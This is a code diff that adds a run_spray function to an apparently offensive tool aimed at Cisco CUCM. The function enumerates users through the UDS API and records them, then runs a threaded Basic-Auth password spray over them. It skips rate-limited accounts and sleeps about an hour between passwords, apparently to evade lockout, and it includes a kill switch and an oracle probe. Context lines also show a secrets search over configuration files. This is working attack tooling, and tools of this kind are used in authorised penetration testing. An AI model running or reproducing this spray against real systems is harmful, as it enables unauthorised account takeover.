@@ -776,6 +776,97 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
                 results['other'] += 1
 
 
+def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_file):
+    """
+    Top-level orchestrator for the UDS Basic-Auth password spray.
+
+    Sequence:
+      1. Pre-flight oracle probe (unless probe=False).
+      2. Enumerate users from /cucm-uds/users, persist to uds_users.
+      3. For each password: build rate-limit-filtered queue, run worker pool,
+         compute kill switch, sleep ~1h before the next password.
+    """
+    # 1. Probe
+    if probe:
+        # Need at least one user to probe; do a tiny pre-enum if necessary.
+        sample_users = get_users_api(cucm_host, port=port)
+        if not sample_users:
+            print('[-] No users returned from UDS; cannot probe or spray.')
+            return
+        oracle_result = _spray_oracle_check(cucm_host, port, sample_users[0])
+        if oracle_result == 'bypass':
+            print('[!] ORACLE BYPASS: /cucm-uds/user/{userid} returned 200 for a bogus password.')
+            print('[!] The endpoint is not validating credentials. Aborting before any real password is sent.')
+            return
+        if oracle_result == 'unknown':
+            print('[-] Oracle probe returned an unexpected status. Aborting.')
+            print('[-] Re-run with --no-spray-probe if you have already verified the target out-of-band.')
+            return
+        print('[+] Oracle probe OK (401 returned for bogus credentials).')
+        users = sample_users
+    else:
+        users = get_users_api(cucm_host, port=port)
+
+    if not users:
+        print('[-] No users returned from UDS. Nothing to spray.')
+        return
+
+    # 2. Persist enumeration
+    record_uds_users(cucm_host, users, db_file)
+    print(f'[+] Loaded {len(users)} users from UDS API.')
+
+    # 3. Per-password rounds
+    total_rounds = len(passwords)
+    for round_index, password in enumerate(passwords, start=1):
+        # 3a. Build filtered work queue on the main thread (TOCTOU-safe).
+        work = queue.Queue()
+        skipped = 0
+        for username in users:
+            if is_user_rate_limited(username, db_file, hours=rate_limit_hours):
+                skipped += 1
+            else:
+                work.put(username)
+        eligible = work.qsize()
+        print(f'[round {round_index}/{total_rounds}] eligible={eligible} skipped={skipped} '
+              f'(rate-limited within last {rate_limit_hours}h)')
+
+        if eligible == 0:
+            print(f'[round {round_index}/{total_rounds}] no eligible users; skipping password.')
+        else:
+            # 3b. Worker pool
+            results = {'hits': 0, 'misses': 0, 'errors': 0, 'other': 0, 'lock': threading.Lock()}
+            dead_flag = threading.Event()
+            worker_threads = []
+            for _ in range(max(1, min(threads, eligible))):
+                t = threading.Thread(
+                    target=_spray_worker,
+                    args=(work, results, password, cucm_host, port, db_file, dead_flag),
+                    daemon=True,
+                )
+                t.start()
+                worker_threads.append(t)
+            for t in worker_threads:
+                t.join()
+
+            total_attempted = results['hits'] + results['misses'] + results['errors'] + results['other']
+            print(f'[round {round_index}/{total_rounds}] hits={results["hits"]} '
+                  f'misses={results["misses"]} errors={results["errors"]} '
+                  f'other={results["other"]} (skipped {skipped})')
+
+            # 3c. Kill switch — >50% of attempts returned non-401-non-200.
+            bad = results['errors'] + results['other']
+            if total_attempted >= 4 and bad / total_attempted > 0.5:
+                print(f'[!] KILL SWITCH: {bad}/{total_attempted} attempts returned errors or '
+                      f'non-401-non-200 status. Aborting run.')
+                return
+
+        # 3d. Inter-round sleep (skip after the last password).
+        if round_index < total_rounds:
+            sleep_secs = 3600 + random.uniform(-60, 60)
+            print(f'[round {round_index}/{total_rounds}] sleeping {sleep_secs:.0f}s until next round...')
+            time.sleep(sleep_secs)
+
+
 def search_for_secrets(CUCM_host, filename, use_tftp=True):
     if debug:
         print(f'[DEBUG] Processing config file: {filename}')
